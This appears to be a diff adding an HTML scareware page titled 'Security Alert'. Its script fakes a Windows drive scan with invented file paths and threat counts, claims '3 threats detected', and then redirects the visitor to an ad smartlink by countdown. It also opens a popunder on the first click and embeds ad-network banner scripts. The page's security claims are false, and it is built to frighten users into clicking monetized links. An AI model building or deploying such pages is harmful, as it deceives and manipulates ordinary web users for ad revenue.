@@ -1,0 +1,501 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Security Alert</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    font-family: 'Segoe UI', Arial, sans-serif;
+    background: #0a0a0a;
+    color: #fff;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: flex-start;
+    overflow-x: hidden;
+  }
+  .bg-grid {
+    position: fixed;
+    inset: 0;
+    background-image: 
+      linear-gradient(rgba(255,50,50,0.03) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(255,50,50,0.03) 1px, transparent 1px);
+    background-size: 40px 40px;
+    z-index: 0;
+  }
+
+  /* Banner */
+  .banner-top {
+    width: 100%; display: flex; justify-content: center; align-items: center;
+    padding: 8px 0; background: rgba(0,0,0,0.5); flex-shrink: 0;
+    z-index: 2; position: relative;
+  }
+  .banner-bottom {
+    width: 100%; display: flex; justify-content: center; align-items: center;
+    padding: 8px 0; background: rgba(0,0,0,0.4); margin-top: auto;
+    z-index: 2; position: relative;
+  }
+
+  .container {
+    position: relative;
+    z-index: 1;
+    width: 100%;
+    max-width: 560px;
+    margin: 0 auto;
+    padding: 20px;
+    text-align: center;
+  }
+  .header {
+    background: #1a0000;
+    border: 1px solid #ff2222;
+    border-radius: 8px 8px 0 0;
+    padding: 10px 20px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    font-size: 12px;
+    color: #ff4444;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+  }
+  .header-dot { width: 8px; height: 8px; border-radius: 50%; background: #ff2222; animation: blink 1s infinite; }
+  @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0.2} }
+  .card {
+    background: #111;
+    border: 1px solid #ff2222;
+    border-top: none;
+    border-radius: 0 0 8px 8px;
+    padding: 30px 32px 32px;
+  }
+  .icon-wrap {
+    position: relative;
+    width: 120px;
+    height: 110px;
+    margin: 0 auto 20px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+  .triangle-svg {
+    position: absolute;
+    top: 0; left: 0;
+    width: 120px; height: 110px;
+    animation: pulse-tri 2s ease-in-out infinite;
+  }
+  @keyframes pulse-tri {
+    0%,100% { filter: drop-shadow(0 0 6px #ff2222); }
+    50% { filter: drop-shadow(0 0 18px #ff4444); }
+  }
+  .exclaim {
+    position: absolute;
+    top: 50%; left: 50%;
+    transform: translate(-50%, -44%);
+    font-size: 46px; font-weight: 900;
+    color: #ff2222; line-height: 1;
+    animation: pulse-tri 2s ease-in-out infinite;
+  }
+  .title {
+    font-size: 28px; font-weight: 800;
+    letter-spacing: 3px; color: #fff; margin-bottom: 4px;
+  }
+  .title span { color: #ff2222; }
+  .subtitle {
+    font-size: 12px; letter-spacing: 3px;
+    color: #ff4444; margin-bottom: 20px; text-transform: uppercase;
+  }
+  .status-box {
+    background: #1a0000; border: 1px solid #ff2222;
+    border-radius: 6px; padding: 14px 20px;
+    display: flex; align-items: center; gap: 16px;
+    margin-bottom: 20px; text-align: left;
+  }
+  .status-text-main {
+    font-size: 13px; font-weight: 700;
+    letter-spacing: 1.5px; color: #fff; text-transform: uppercase;
+  }
+  .status-text-sub {
+    font-size: 11px; color: #ff4444;
+    letter-spacing: 1px; margin-top: 2px;
+    animation: blink 1s infinite;
+  }
+
+  /* === SCAN BOX seperti Drive C === */
+  .scan-box {
+    background: #0a0a0a;
+    border: 1px solid #2a2a2a;
+    border-radius: 6px;
+    padding: 10px 14px;
+    margin-bottom: 14px;
+    text-align: left;
+    font-family: 'Courier New', monospace;
+  }
+  .scan-box-title {
+    font-size: 10px; color: #666;
+    letter-spacing: 2px; text-transform: uppercase;
+    margin-bottom: 8px; border-bottom: 1px solid #1a1a1a;
+    padding-bottom: 6px;
+  }
+  .scan-path {
+    font-size: 11px;
+    color: #00cc44;
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+    min-height: 16px;
+    line-height: 1.5;
+  }
+  .scan-path span { color: #ff6644; }
+  .scan-current {
+    font-size: 10px; color: #555;
+    margin-top: 4px; letter-spacing: 1px;
+  }
+
+  .scan-label {
+    font-size: 11px; letter-spacing: 2px;
+    color: #888; text-align: left;
+    margin-bottom: 6px; text-transform: uppercase;
+  }
+  .scan-track {
+    background: #1a1a1a; border-radius: 3px;
+    height: 14px; overflow: hidden;
+    margin-bottom: 6px; border: 1px solid #333;
+  }
+  .scan-fill {
+    height: 100%; width: 0%;
+    background: linear-gradient(90deg, #ff2222, #ff6644);
+    border-radius: 2px;
+    transition: width 0.1s linear;
+    box-shadow: 0 0 8px rgba(255,34,34,0.6);
+  }
+  .scan-pct {
+    font-size: 12px; color: #ff4444;
+    text-align: right; font-weight: 700;
+    letter-spacing: 1px; margin-bottom: 16px;
+  }
+  .scan-stats-row {
+    display: flex; justify-content: space-between;
+    font-family: 'Courier New', monospace;
+    font-size: 10px; color: #555;
+    margin-bottom: 18px;
+    border-top: 1px solid #1a1a1a;
+    padding-top: 8px;
+  }
+  .scan-stat-item { text-align: center; }
+  .scan-stat-item span { display: block; color: #ff4444; font-weight: 700; font-size: 12px; }
+
+  .stats {
+    display: flex; justify-content: space-around;
+    border-top: 1px solid #222;
+    padding-top: 20px; margin-bottom: 24px;
+  }
+  .stat { text-align: center; }
+  .stat-icon { font-size: 20px; margin-bottom: 4px; }
+  .stat-label { font-size: 9px; letter-spacing: 1.5px; color: #666; text-transform: uppercase; }
+  .stat-val { font-size: 11px; color: #44ff88; font-weight: 700; letter-spacing: 1px; }
+  .cta-btn {
+    display: block; width: 100%; padding: 16px;
+    background: #ff2222; color: #fff;
+    font-size: 15px; font-weight: 800;
+    letter-spacing: 2px; text-transform: uppercase;
+    border: none; border-radius: 6px;
+    cursor: pointer; text-decoration: none;
+    transition: background 0.2s, transform 0.1s;
+    animation: pulse-btn 2s ease-in-out infinite;
+  }
+  @keyframes pulse-btn {
+    0%,100%{ box-shadow: 0 0 10px #ff222266; }
+    50%{ box-shadow: 0 0 24px #ff2222aa; }
+  }
+  .cta-btn:hover { background: #cc0000; transform: scale(1.01); }
+  .redirect-overlay {
+    display: none; position: fixed; inset: 0;
+    background: rgba(0,0,0,0.95); z-index: 999;
+    align-items: center; justify-content: center;
+    flex-direction: column; text-align: center; padding: 20px;
+  }
+  .redirect-overlay.show { display: flex; }
+  .redirect-title { font-size: 20px; font-weight: 800; color: #ff2222; letter-spacing: 2px; margin-bottom: 8px; }
+  .redirect-sub { font-size: 13px; color: #aaa; margin-bottom: 8px; }
+  .redirect-count { font-size: 48px; font-weight: 900; color: #ff2222; animation: pulse-tri 1s ease-in-out infinite; }
+</style>
+</head>
+<body>
+<div class="bg-grid"></div>
+
+<!-- BANNER TOP (320x50) -->
+<div class="banner-top">
+  <script>
+    atOptions = {
+      'key' : 'f0a9357fc524712b4e1f8906d53dbe9f',
+      'format' : 'iframe',
+      'height' : 50,
+      'width' : 320,
+      'params' : {}
+    };
+  </script>
+  <script src="https://www.highperformanceformat.com/f0a9357fc524712b4e1f8906d53dbe9f/invoke.js"></script>
+</div>
+
+<div class="container">
+  <div class="header">
+    <div style="display:flex;align-items:center;gap:8px;">
+      <div class="header-dot"></div>
+      <span>Security Center</span>
+    </div>
+    <span>LIVE MONITORING</span>
+  </div>
+
+  <div class="card">
+    <div class="icon-wrap">
+      <svg class="triangle-svg" viewBox="0 0 120 110" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M60 8 L112 100 H8 Z" stroke="#ff2222" stroke-width="4" fill="rgba(255,34,34,0.08)" stroke-linejoin="round"/>
+      </svg>
+      <div class="exclaim">!</div>
+    </div>
+
+    <div class="title">SECURITY <span>ALERT</span></div>
+    <div class="subtitle">| Unauthorized Access Detected |</div>
+
+    <div class="status-box">
+      <div style="flex-shrink:0;">
+        <svg width="36" height="36" viewBox="0 0 36 36" fill="none">
+          <rect x="7" y="17" width="22" height="15" rx="3" stroke="#ff2222" stroke-width="2" fill="rgba(255,34,34,0.1)"/>
+          <path d="M12 17V13C12 9.69 14.69 7 18 7C21.31 7 24 9.69 24 13V17" stroke="#ff2222" stroke-width="2" stroke-linecap="round"/>
+          <circle cx="18" cy="24" r="2.5" fill="#ff2222"/>
+          <line x1="18" y1="26.5" x2="18" y2="29" stroke="#ff2222" stroke-width="2" stroke-linecap="round"/>
+        </svg>
+      </div>
+      <div>
+        <div class="status-text-main">Your system is being monitored</div>
+        <div class="status-text-sub" id="statusSub">PLEASE STAND BY...</div>
+      </div>
+    </div>
+
+    <!-- SCAN BOX FILE PATH -->
+    <div class="scan-box">
+      <div class="scan-box-title">📂 Scanning Drive C:\</div>
+      <div class="scan-path" id="scanPath"><span>C:\</span>Windows\System32\...</div>
+      <div class="scan-current" id="scanCurrent">Files scanned: 0</div>
+    </div>
+
+    <div class="scan-label" id="scanLabel">Scanning System...</div>
+    <div class="scan-track">
+      <div class="scan-fill" id="scanFill"></div>
+    </div>
+    <div class="scan-pct" id="scanPct">0%</div>
+
+    <!-- Stats row -->
+    <div class="scan-stats-row">
+      <div class="scan-stat-item">FILES SCANNED<span id="statFiles">0</span></div>
+      <div class="scan-stat-item">THREATS FOUND<span id="statThreats" style="color:#ff2222">0</span></div>
+      <div class="scan-stat-item">INFECTED<span id="statInfected" style="color:#ff6644">0</span></div>
+      <div class="scan-stat-item">TIME LEFT<span id="statTime">15s</span></div>
+    </div>
+
+    <div class="stats">
+      <div class="stat">
+        <div class="stat-icon">🛡️</div>
+        <div class="stat-label">System Protection</div>
+        <div class="stat-val">ACTIVE</div>
+      </div>
+      <div class="stat">
+        <div class="stat-icon">🌐</div>
+        <div class="stat-label">Network Security</div>
+        <div class="stat-val">SECURE</div>
+      </div>
+      <div class="stat">
+        <div class="stat-icon">🔥</div>
+        <div class="stat-label">Firewall</div>
+        <div class="stat-val">ACTIVE</div>
+      </div>
+      <div class="stat">
+        <div class="stat-icon">🔍</div>
+        <div class="stat-label">Threat Detection</div>
+        <div class="stat-val">ON</div>
+      </div>
+    </div>
+
+    <a href="https://your-smartlink.com" class="cta-btn" id="ctaBtn">
+      🔒 SECURE YOUR DEVICE NOW
+    </a>
+  </div>
+</div>
+
+<!-- BANNER BOTTOM (728x90) -->
+<div class="banner-bottom">
+  <script>
+    atOptions = {
+      'key' : 'd95408cf651958681e0159f8c3b4a8d9',
+      'format' : 'iframe',
+      'height' : 90,
+      'width' : 728,
+      'params' : {}
+    };
+  </script>
+  <script src="https://www.highperformanceformat.com/d95408cf651958681e0159f8c3b4a8d9/invoke.js"></script>
+</div>
+
+<!-- REDIRECT OVERLAY -->
+<div class="redirect-overlay" id="redirectOverlay">
+  <div style="font-size:48px;margin-bottom:16px;">⚠️</div>
+  <div class="redirect-title">3 THREATS DETECTED!</div>
+  <div class="redirect-sub">Redirecting to protection page in...</div>
+  <div class="redirect-count" id="countNum">3</div>
+</div>
+
+<script>
+  var SMARTLINK = 'https://your-smartlink.com';
+
+  // Pop under
+  var popped = false;
+  function doPopunder() {
+    if (popped) return; popped = true;
+    var w = window.open('about:blank', '_blank');
+    if (w) {
+      w.document.write('<script>window.location="' + SMARTLINK + '";<\/script>');
+      w.blur(); window.focus();
+    }
+  }
+  document.addEventListener('click', doPopunder, { once: true });
+  document.addEventListener('touchstart', doPopunder, { once: true });
+
+  // File paths untuk animasi scan
+  var filePaths = [
+    'C:\\Windows\\System32\\drivers\\etc\\hosts',
+    'C:\\Windows\\System32\\svchost.exe',
+    'C:\\Windows\\System32\\ntoskrnl.exe',
+    'C:\\Windows\\SysWOW64\\kernel32.dll',
+    'C:\\Windows\\System32\\config\\SOFTWARE',
+    'C:\\Users\\AppData\\Local\\Temp\\tmp8A21.tmp',
+    'C:\\Windows\\System32\\lsass.exe',
+    'C:\\Program Files\\Common Files\\system\\ado\\msado15.dll',
+    'C:\\Users\\AppData\\Roaming\\Microsoft\\Windows\\Recent',
+    'C:\\Windows\\System32\\wbem\\wmiprvse.exe',
+    'C:\\Users\\AppData\\Local\\Google\\Chrome\\User Data\\Default',
+    'C:\\Windows\\System32\\drivers\\tcpip.sys',
+    'C:\\Program Files (x86)\\Internet Explorer\\iexplore.exe',
+    'C:\\Windows\\Prefetch\\SVCHOST.EXE-AB8B5EBC.pf',
+    'C:\\Users\\AppData\\Local\\Temp\\~DF3A12.tmp',
+    'C:\\Windows\\System32\\cryptsvc.dll',
+    'C:\\Windows\\SysWOW64\\msvcp140.dll',
+    'C:\\ProgramData\\Microsoft\\Windows Defender\\Scans',
+    'C:\\Windows\\System32\\spoolsv.exe',
+    'C:\\Users\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles',
+    'C:\\Windows\\System32\\services.exe',
+    'C:\\Windows\\System32\\SearchIndexer.exe',
+    'C:\\Users\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana',
+    'C:\\Windows\\System32\\taskhost.exe',
+    'C:\\Program Files\\Windows Defender\\MsMpEng.exe',
+    'C:\\Windows\\System32\\dllhost.exe',
+    'C:\\Users\\AppData\\Roaming\\skype\\shared.xml',
+    'C:\\Windows\\System32\\winlogon.exe',
+    'C:\\Users\\AppData\\Local\\Temp\\install_flashplayer.exe',
+    'C:\\Windows\\System32\\csrss.exe',
+  ];
+
+  var pathEl      = document.getElementById('scanPath');
+  var currentEl   = document.getElementById('scanCurrent');
+  var fill        = document.getElementById('scanFill');
+  var pctEl       = document.getElementById('scanPct');
+  var statusSub   = document.getElementById('statusSub');
+  var scanLabel   = document.getElementById('scanLabel');
+  var statFiles   = document.getElementById('statFiles');
+  var statThreats = document.getElementById('statThreats');
+  var statInfected= document.getElementById('statInfected');
+  var statTime    = document.getElementById('statTime');
+
+  var pct          = 0;
+  var filesScanned = 0;
+  var threats      = 0;
+  var infected     = 0;
+  var timeLeft     = 15;
+  var pathIndex    = 0;
+
+  var DURATION_MS  = 15000;
+  var INTERVAL_MS  = 100;
+  var STEPS        = DURATION_MS / INTERVAL_MS; // 150
+  var INCREMENT    = 100 / STEPS;
+
+  // Update file path tiap 300ms
+  var pathTimer = setInterval(function() {
+    var p = filePaths[pathIndex % filePaths.length];
+    var parts = p.split('\\');
+    var drive = parts[0] + '\\';
+    var rest  = parts.slice(1).join('\\');
+    pathEl.innerHTML = '<span>' + drive + '</span>' + rest;
+    pathIndex++;
+    filesScanned += Math.floor(Math.random() * 120 + 40);
+    currentEl.textContent = 'Files scanned: ' + filesScanned.toLocaleString();
+    statFiles.textContent = filesScanned.toLocaleString();
+  }, 300);
+
+  // Countdown waktu tiap 1 detik
+  var timeTimer = setInterval(function() {
+    timeLeft--;
+    statTime.textContent = timeLeft + 's';
+    if (timeLeft <= 0) clearInterval(timeTimer);
+  }, 1000);
+
+  // Progress bar utama tiap 100ms
+  var scanInterval = setInterval(function() {
+    pct = Math.min(pct + INCREMENT, 100);
+    fill.style.width = pct.toFixed(2) + '%';
+    pctEl.textContent = Math.floor(pct) + '%';
+
+    // Pesan berubah
+    if (pct >= 95) {
+      scanLabel.textContent = 'Finalizing report...';
+      statusSub.textContent = 'CRITICAL RISK FOUND!';
+    } else if (pct >= 80) {
+      scanLabel.textContent = 'Verifying intrusions...';
+      statusSub.textContent = 'ANALYZING THREATS...';
+      if (threats < 3) { threats++; statThreats.textContent = threats; }
+      if (infected < 2) { infected++; statInfected.textContent = infected; }
+    } else if (pct >= 60) {
+      scanLabel.textContent = 'Detecting threats...';
+      statusSub.textContent = 'THREATS DETECTED...';
+      if (threats < 1) { threats = 1; statThreats.textContent = threats; }
+    } else if (pct >= 40) {
+      scanLabel.textContent = 'Analyzing network traffic...';
+      statusSub.textContent = 'MONITORING CONNECTIONS...';
+    } else if (pct >= 20) {
+      scanLabel.textContent = 'Checking OS files...';
+      statusSub.textContent = 'SCANNING IN PROGRESS...';
+    }
+
+    if (pct >= 100) {
+      clearInterval(scanInterval);
+      clearInterval(pathTimer);
+      clearInterval(timeTimer);
+      fill.style.width = '100%';
+      pctEl.textContent = '100%';
+      statTime.textContent = '0s';
+      setTimeout(startRedirect, 500);
+    }
+  }, INTERVAL_MS);
+
+  function startRedirect() {
+    document.getElementById('redirectOverlay').classList.add('show');
+    var count = 3;
+    var countEl = document.getElementById('countNum');
+    var cd = setInterval(function() {
+      count--;
+      countEl.textContent = count;
+      if (count <= 0) {
+        clearInterval(cd);
+        window.location.href = SMARTLINK;
+      }
+    }, 1000);
+  }
+
+  document.getElementById('ctaBtn').addEventListener('click', function(e) {
+    e.preventDefault();
+    doPopunder();
+    window.location.href = SMARTLINK;
+  });
+</script>
+</body>
+</html>
